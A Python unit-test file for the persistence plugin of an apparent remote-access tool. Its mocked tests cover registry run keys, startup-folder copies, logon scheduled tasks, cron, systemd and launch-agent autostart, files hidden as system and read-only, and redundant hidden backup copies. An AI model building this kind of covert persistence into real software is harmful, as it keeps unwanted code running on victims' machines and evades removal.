"""
Unit tests for Persistence Plugin

Tests persistence installation, removal, verification, and platform-specific methods.

Requirements: 7.1, 7.2, 7.3, 7.4, 7.5, 7.6, 7.7, 7.8, 22.1, 22.2, 22.3
"""

import pytest
import platform
from unittest.mock import Mock, patch, MagicMock, mock_open
from remote_system.plugins.persistence_plugin import (
    PersistencePlugin,
    PersistenceResult,
    PersistenceStatus
)


@pytest.fixture
def plugin():
    """Create a PersistencePlugin instance for testing"""
    return PersistencePlugin()


class TestPersistencePluginBasics:
    """Test basic plugin functionality"""
    
    def test_get_name(self, plugin):
        """Test plugin name"""
        assert plugin.get_name() == "persistence"
    
    def test_get_required_arguments(self, plugin):
        """Test required arguments"""
        required = plugin.get_required_arguments()
        assert 'action' in required
    
    def test_execute_invalid_action(self, plugin):
        """Test execute with invalid action"""
        with pytest.raises(ValueError, match="Invalid action"):
            plugin.execute({'action': 'invalid_action'})


class TestGetAvailableMethods:
    """Test platform-specific method selection"""
    
    @patch('platform.system', return_value='Windows')
    def test_windows_methods(self, mock_system):
        """Test available methods on Windows"""
        plugin = PersistencePlugin()
        methods = plugin.get_available_methods()
        
        assert 'registry' in methods
        assert 'startup' in methods
        assert 'scheduled_task' in methods
    
    @patch('platform.system', return_value='Linux')
    def test_linux_methods(self, mock_system):
        """Test available methods on Linux"""
        plugin = PersistencePlugin()
        methods = plugin.get_available_methods()
        
        assert 'cron' in methods
        assert 'systemd' in methods
    
    @patch('platform.system', return_value='Darwin')
    def test_macos_methods(self, mock_system):
        """Test available methods on macOS"""
        plugin = PersistencePlugin()
        methods = plugin.get_available_methods()
        
        assert 'launch_agent' in methods



class TestWindowsPersistence:
    """Test Windows-specific persistence methods"""
    
    @patch('platform.system', return_value='Windows')
    def test_install_windows_registry(self, mock_system):
        """Test Windows registry persistence installation"""
        # Setup mocks
        with patch('winreg.OpenKey') as mock_open, \
             patch('winreg.SetValueEx') as mock_set, \
             patch('winreg.CloseKey') as mock_close:
            
            mock_key = MagicMock()
            mock_open.return_value = mock_key
            
            plugin = PersistencePlugin()
            result = plugin._install_windows_registry()
            
            assert result is True
            mock_open.assert_called_once()
            mock_set.assert_called_once()
            mock_close.assert_called_once_with(mock_key)
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._set_windows_file_attributes')
    @patch('shutil.copy2')
    @patch('os.path.exists')
    def test_install_windows_startup(self, mock_exists, mock_copy, mock_set_attrs, mock_system):
        """Test Windows startup folder persistence installation"""
        # First call checks startup folder exists, second checks if target file exists
        mock_exists.side_effect = [True, False]
        
        plugin = PersistencePlugin()
        
        with patch.dict('os.environ', {'APPDATA': 'C:\\Users\\Test\\AppData\\Roaming'}):
            result = plugin._install_windows_startup()
        
        assert result is True
        mock_copy.assert_called_once()
        mock_set_attrs.assert_called_once()
    
    @patch('platform.system', return_value='Windows')
    @patch('subprocess.run')
    def test_install_windows_scheduled_task(self, mock_run, mock_system):
        """Test Windows scheduled task persistence installation"""
        # Setup mock
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        plugin = PersistencePlugin()
        result = plugin._install_windows_scheduled_task()
        
        assert result is True
        mock_run.assert_called_once()
        
        # Verify schtasks command was called
        call_args = mock_run.call_args[0][0]
        assert 'schtasks' in call_args
        assert '/create' in call_args
        assert '/sc' in call_args
        assert 'onlogon' in call_args
    
    @patch('platform.system', return_value='Windows')
    @patch('subprocess.run')
    def test_set_windows_file_attributes(self, mock_run, mock_system):
        """Test setting Windows file attributes (hidden, system, read-only)"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        plugin = PersistencePlugin()
        result = plugin._set_windows_file_attributes('test.exe')
        
        assert result is True
        mock_run.assert_called_once()
        
        # Verify attrib command
        call_args = mock_run.call_args[0][0]
        assert 'attrib' in call_args
        assert '+h' in call_args
        assert '+s' in call_args
        assert '+r' in call_args



class TestLinuxPersistence:
    """Test Linux-specific persistence methods"""
    
    @patch('platform.system', return_value='Linux')
    @patch('subprocess.run')
    def test_install_linux_cron(self, mock_run, mock_system):
        """Test Linux cron job persistence installation"""
        # Setup mocks - first call returns existing crontab, second installs new
        mock_result_list = MagicMock()
        mock_result_list.returncode = 0
        mock_result_list.stdout = "# Existing crontab\n"
        
        mock_result_install = MagicMock()
        mock_result_install.returncode = 0
        
        mock_run.side_effect = [mock_result_list, mock_result_install]
        
        plugin = PersistencePlugin()
        result = plugin._install_linux_cron()
        
        assert result is True
        assert mock_run.call_count == 2
        
        # Verify crontab commands
        first_call = mock_run.call_args_list[0][0][0]
        assert 'crontab' in first_call
        assert '-l' in first_call
    
    @patch('platform.system', return_value='Linux')
    @patch('subprocess.run')
    @patch('builtins.open', new_callable=mock_open)
    @patch('os.makedirs')
    def test_install_linux_systemd(self, mock_makedirs, mock_file, mock_run, mock_system):
        """Test Linux systemd service persistence installation"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        plugin = PersistencePlugin()
        result = plugin._install_linux_systemd()
        
        assert result is True
        mock_makedirs.assert_called_once()
        mock_file.assert_called_once()
        
        # Verify systemctl commands were called
        assert mock_run.call_count == 2
        
        # Check enable command
        enable_call = mock_run.call_args_list[0][0][0]
        assert 'systemctl' in enable_call
        assert '--user' in enable_call
        assert 'enable' in enable_call


class TestMacOSPersistence:
    """Test macOS-specific persistence methods"""
    
    @patch('platform.system', return_value='Darwin')
    @patch('subprocess.run')
    @patch('builtins.open', new_callable=mock_open)
    @patch('os.makedirs')
    def test_install_macos_launch_agent(self, mock_makedirs, mock_file, mock_run, mock_system):
        """Test macOS launch agent persistence installation"""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        plugin = PersistencePlugin()
        result = plugin._install_macos_launch_agent()
        
        assert result is True
        mock_makedirs.assert_called_once()
        mock_file.assert_called_once()
        
        # Verify launchctl command
        mock_run.assert_called_once()
        call_args = mock_run.call_args[0][0]
        assert 'launchctl' in call_args
        assert 'load' in call_args



class TestBackupManagement:
    """Test backup copy creation and management"""
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._set_windows_file_attributes')
    @patch('shutil.copy2')
    @patch('os.path.exists', return_value=False)
    @patch('os.makedirs')
    def test_create_backups_windows(self, mock_makedirs, mock_exists, mock_copy, mock_set_attrs, mock_system):
        """Test backup creation on Windows"""
        plugin = PersistencePlugin()
        
        with patch.dict('os.environ', {
            'APPDATA': 'C:\\Users\\Test\\AppData\\Roaming',
            'LOCALAPPDATA': 'C:\\Users\\Test\\AppData\\Local',
            'TEMP': 'C:\\Temp'
        }):
            backups = plugin._create_backups()
        
        # Should create backups in multiple locations
        assert len(backups) > 0
        assert mock_copy.call_count > 0
        assert mock_set_attrs.call_count > 0
    
    @patch('platform.system', return_value='Linux')
    @patch('shutil.copy2')
    @patch('os.path.exists', return_value=False)
    @patch('os.makedirs')
    def test_create_backups_linux(self, mock_makedirs, mock_exists, mock_copy, mock_system):
        """Test backup creation on Linux"""
        plugin = PersistencePlugin()
        backups = plugin._create_backups()
        
        # Should create backups in multiple locations
        assert len(backups) > 0
        assert mock_copy.call_count > 0
    
    @patch('platform.system', return_value='Windows')
    @patch('os.path.exists', return_value=True)
    def test_count_backups(self, mock_exists, mock_system):
        """Test counting backup copies"""
        plugin = PersistencePlugin()
        
        with patch.dict('os.environ', {
            'APPDATA': 'C:\\Users\\Test\\AppData\\Roaming',
            'LOCALAPPDATA': 'C:\\Users\\Test\\AppData\\Local',
            'TEMP': 'C:\\Temp'
        }):
            count = plugin._count_backups()
        
        # Should find backups
        assert count > 0


class TestPersistenceInstallation:
    """Test persistence installation with method selection"""
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._create_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._install_method')
    def test_install_persistence_auto(self, mock_install_method, mock_backups, mock_system):
        """Test auto installation (all methods)"""
        mock_install_method.return_value = True
        mock_backups.return_value = ['backup1', 'backup2']
        
        plugin = PersistencePlugin()
        result = plugin.install_persistence('auto')
        
        assert result.success is True
        assert len(result.methods_installed) > 0
        assert len(result.backup_locations) == 2
        assert result.error is None
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._create_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._install_method')
    def test_install_persistence_specific_method(self, mock_install_method, mock_backups, mock_system):
        """Test installation with specific method"""
        mock_install_method.return_value = True
        mock_backups.return_value = ['backup1']
        
        plugin = PersistencePlugin()
        result = plugin.install_persistence('registry')
        
        assert result.success is True
        assert 'registry' in result.methods_installed
        mock_install_method.assert_called_once_with('registry')
    
    @patch('platform.system', return_value='Windows')
    def test_install_persistence_invalid_method(self, mock_system):
        """Test installation with invalid method for platform"""
        plugin = PersistencePlugin()
        result = plugin.install_persistence('cron')  # Linux method on Windows
        
        assert result.success is False
        assert 'not available' in result.error



class TestPersistenceRemoval:
    """Test persistence removal"""
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_windows_persistence')
    def test_remove_persistence_windows(self, mock_remove_windows, mock_remove_backups, mock_system):
        """Test persistence removal on Windows"""
        mock_remove_windows.return_value = True
        mock_remove_backups.return_value = True
        
        plugin = PersistencePlugin()
        result = plugin.remove_persistence()
        
        assert result is True
        mock_remove_windows.assert_called_once()
        mock_remove_backups.assert_called_once()
    
    @patch('platform.system', return_value='Linux')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_linux_persistence')
    def test_remove_persistence_linux(self, mock_remove_linux, mock_remove_backups, mock_system):
        """Test persistence removal on Linux"""
        mock_remove_linux.return_value = True
        mock_remove_backups.return_value = True
        
        plugin = PersistencePlugin()
        result = plugin.remove_persistence()
        
        assert result is True
        mock_remove_linux.assert_called_once()
        mock_remove_backups.assert_called_once()


class TestPersistenceVerification:
    """Test persistence verification"""
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._count_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._check_windows_persistence')
    def test_check_persistence_installed(self, mock_check_windows, mock_count, mock_system):
        """Test checking persistence when installed"""
        mock_check_windows.return_value = (['registry', 'startup'], {'registry': 'path'})
        mock_count.return_value = 3
        
        plugin = PersistencePlugin()
        status = plugin.check_persistence()
        
        assert status.installed is True
        assert len(status.active_methods) == 2
        assert status.backup_count == 3
        assert 'registry' in status.active_methods
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._count_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._check_windows_persistence')
    def test_check_persistence_not_installed(self, mock_check_windows, mock_count, mock_system):
        """Test checking persistence when not installed"""
        mock_check_windows.return_value = ([], {})
        mock_count.return_value = 0
        
        plugin = PersistencePlugin()
        status = plugin.check_persistence()
        
        assert status.installed is False
        assert len(status.active_methods) == 0
        assert status.backup_count == 0


class TestPluginActions:
    """Test plugin action handlers"""
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._create_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._install_method')
    def test_execute_install_action(self, mock_install_method, mock_backups, mock_system):
        """Test execute with install action"""
        mock_install_method.return_value = True
        mock_backups.return_value = ['backup1']
        
        plugin = PersistencePlugin()
        result = plugin.execute({'action': 'install', 'method': 'auto'})
        
        assert result['success'] is True
        assert len(result['methods_installed']) > 0
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._remove_windows_persistence')
    def test_execute_remove_action(self, mock_remove_windows, mock_remove_backups, mock_system):
        """Test execute with remove action"""
        mock_remove_windows.return_value = True
        mock_remove_backups.return_value = True
        
        plugin = PersistencePlugin()
        result = plugin.execute({'action': 'remove'})
        
        assert result['success'] is True
    
    @patch('platform.system', return_value='Windows')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._count_backups')
    @patch('remote_system.plugins.persistence_plugin.PersistencePlugin._check_windows_persistence')
    def test_execute_check_action(self, mock_check_windows, mock_count, mock_system):
        """Test execute with check action"""
        mock_check_windows.return_value = (['registry'], {'registry': 'path'})
        mock_count.return_value = 2
        
        plugin = PersistencePlugin()
        result = plugin.execute({'action': 'check'})
        
        assert result['installed'] is True
        assert len(result['active_methods']) == 1
        assert result['backup_count'] == 2
    
    @patch('platform.system', return_value='Windows')
    def test_execute_get_methods_action(self, mock_system):
        """Test execute with get_methods action"""
        plugin = PersistencePlugin()
        result = plugin.execute({'action': 'get_methods'})
        
        assert result['platform'] == 'Windows'
        assert 'available_methods' in result
        assert len(result['available_methods']) > 0
